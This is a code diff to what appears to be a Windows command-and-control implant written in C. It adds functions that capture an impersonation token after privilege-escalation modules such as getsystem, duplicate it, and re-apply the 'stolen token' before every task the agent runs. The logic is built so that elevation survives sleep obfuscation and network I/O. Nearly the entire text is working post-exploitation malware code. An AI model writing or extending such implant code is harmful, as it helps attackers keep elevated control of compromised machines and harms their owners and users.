@@ -30,6 +30,53 @@ static void generate_agent_id(unsigned char *id_out) {
     id_out[8] = (id_out[8] & 0x3F) | 0x80;  /* Variant 1 */
 }
 
+/* ─── Token impersonation persistence ─── */
+
+/*
+ * After a BOF/module sets thread impersonation (e.g. getsystem), capture the
+ * token handle so we can re-apply it before every subsequent task.  This
+ * survives sleep obfuscation, HTTP I/O, and anything else that might
+ * implicitly revert the thread token.
+ */
+static void capture_thread_token(AgentState *state) {
+    HANDLE hThreadToken = NULL;
+    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
+                        FALSE, &hThreadToken)) {
+        /* Thread IS impersonating — store it if we don't already have one,
+           or if it's a different token (new getsystem/tokenmanip call). */
+        if (state->impersonation_token == NULL) {
+            HANDLE hDup = NULL;
+            if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
+                                 SecurityImpersonation, TokenImpersonation, &hDup)) {
+                state->impersonation_token = hDup;
+                DBG("[token] captured impersonation token (handle=0x%p)", hDup);
+            }
+        }
+        CloseHandle(hThreadToken);
+    } else if (state->impersonation_token != NULL) {
+        /* Thread is NOT impersonating but we had a stored token —
+           a module (rev2self) must have reverted. Clear our stored token. */
+        DBG("[token] impersonation cleared (rev2self or explicit revert)");
+        CloseHandle(state->impersonation_token);
+        state->impersonation_token = NULL;
+    }
+}
+
+static void apply_impersonation(AgentState *state) {
+    if (state->impersonation_token != NULL) {
+        if (ImpersonateLoggedOnUser(state->impersonation_token)) {
+            DBG("[token] re-applied impersonation token (handle=0x%p)",
+                state->impersonation_token);
+        } else {
+            DBG("[token] ImpersonateLoggedOnUser FAILED (err=%u) — token may be stale",
+                GetLastError());
+            /* Token is invalid — clear it */
+            CloseHandle(state->impersonation_token);
+            state->impersonation_token = NULL;
+        }
+    }
+}
+
 /* ─── Send task result with chunking ─── */
 
 static BOOL send_result_chunk(AgentState *state, const unsigned char *task_id,
@@ -115,6 +162,7 @@ BOOL agent_init(AgentState *state) {
     state->running = TRUE;
     state->nonce_counter = 0;  /* Agent uses even counters */
     state->msg_id = 0;
+    state->impersonation_token = NULL;
 
     DBG("[init] agent_init starting, sleep=%d jitter=%d", CONFIG_SLEEP_MS, CONFIG_JITTER_PCT);
 
@@ -377,6 +425,9 @@ BOOL agent_checkin(AgentState *state) {
         return FALSE;
     }
 
+    /* Re-apply impersonation so sysinfo reports the elevated identity */
+    apply_impersonation(state);
+
     /* Build check-in TLV body */
     Buffer body;
     buf_init(&body, 1024);
@@ -492,6 +543,9 @@ BOOL agent_checkin(AgentState *state) {
                     DWORD result_len = 0;
                     BOOL success = FALSE;
 
+                    /* Re-apply stolen token before task execution */
+                    apply_impersonation(state);
+
                     if (current_task.task_type == TASK_BOF) {
                         DBG("[task] dispatching as BOF");
                         success = coff_load_and_execute(
@@ -515,6 +569,9 @@ BOOL agent_checkin(AgentState *state) {
                                                   &result, &result_len);
                     }
                     DBG("[task] execution done: success=%d result_len=%u", success, result_len);
+
+                    /* Capture thread token if task set impersonation (e.g. getsystem) */
+                    capture_thread_token(state);
 
                     BOOL send_ok = send_task_result(state, current_task.task_id,
                                     result, result_len, success);
@@ -599,6 +656,9 @@ BOOL agent_checkin(AgentState *state) {
             DWORD result_len = 0;
             BOOL success = FALSE;
 
+            /* Re-apply stolen token before task execution */
+            apply_impersonation(state);
+
             if (current_task.task_type == TASK_BOF) {
                 DBG("[task] dispatching as BOF");
                 success = coff_load_and_execute(
@@ -623,6 +683,9 @@ BOOL agent_checkin(AgentState *state) {
             }
 
             DBG("[task] execution done: success=%d result_len=%u", success, result_len);
+
+            /* Capture thread token if task set impersonation (e.g. getsystem) */
+            capture_thread_token(state);
 
             BOOL send_ok = send_task_result(state, current_task.task_id,
                             result, result_len, success);
